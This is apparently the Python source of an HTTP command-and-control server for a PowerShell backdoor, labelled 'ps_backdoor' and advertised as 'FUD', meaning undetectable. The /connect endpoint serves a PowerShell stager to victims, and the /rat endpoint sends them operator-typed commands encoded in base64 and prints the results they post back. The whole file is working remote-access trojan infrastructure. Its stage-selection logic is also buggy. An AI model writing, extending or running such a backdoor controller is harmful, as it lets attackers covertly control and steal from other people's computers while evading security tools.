from http.server import BaseHTTPRequestHandler, HTTPServer
import base64
import argparse
from payloads import *
from sys import exit
stage_activated = None

class myHandler(BaseHTTPRequestHandler):
    
    def log_message(self, fomart , *tes):
        pass

    def do_GET(self):
        if (self.path == "/connect"):
            self.send_response(200)
            self.send_header('Content-type', 1)
            self.end_headers()
            self.wfile.write(stage_activated.getCode().encode())
        
        elif "/rat" == self.path:
            self.send_response(200)
            cmd = base64.b64encode(input("(ps_backdoor) > ").encode('latin-1'))
            self.send_header('Content-type', 1)
            self.end_headers()
            self.wfile.write(cmd)

    def do_POST(self):
        if "/rat" == self.path:
            content_len = int(self.headers.get('content-length', 0))
            post_read = self.rfile.read(content_len).decode('latin-1')
            print(post_read)
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="ps_backdoor - simple backdoor http powershell FUD")
    parser.add_argument('-i','--ip-addr',  dest='ip',help='set the ip address to server',default='0.0.0.0')
    parser.add_argument('-p','--port',  dest='port',help='set the port the handler',default=8000)
    parser.add_argument('-s','--stage',  dest='stage',help='set payload shell ',default=None)
    parser_load = parser.parse_args()
    print('Author: Curso Security TOol {} ')
    print('[*] Starting the server...')
    print('[*] HOST: {}:{}'.format(parser_load.ip,parser_load.port))

    
    all_stagers = base.BasePayload.__subclasses__()
    stagers = {}
    for stage in all_stagers:
        stagers[stage.getName().lower()] = stage()


    if (parser_load.stage == None):
        if (parser_load.stage.lower() in list(stagers.keys())):
            for stage in stagers.keys():
                if (stagers[stage].getActivated()):
                    stage_activated = stagers[stage]
    else:
        stage_activated = stagers[parser_load.stage.lower()]

    print("[*] plugin: " + stage_activated.getName())
    if (stage_activated == None):
        exit("[!] the payload {} not found!".format(parser_load.stage))

    try:
        stage_activated.setHandler(parser_load.ip, parser_load.port)
        server = HTTPServer((parser_load.ip, int(parser_load.port)), myHandler)
        server.serve_forever()
    except KeyboardInterrupt:
        print('^C received, shutting down the web server')
        server.socket.close()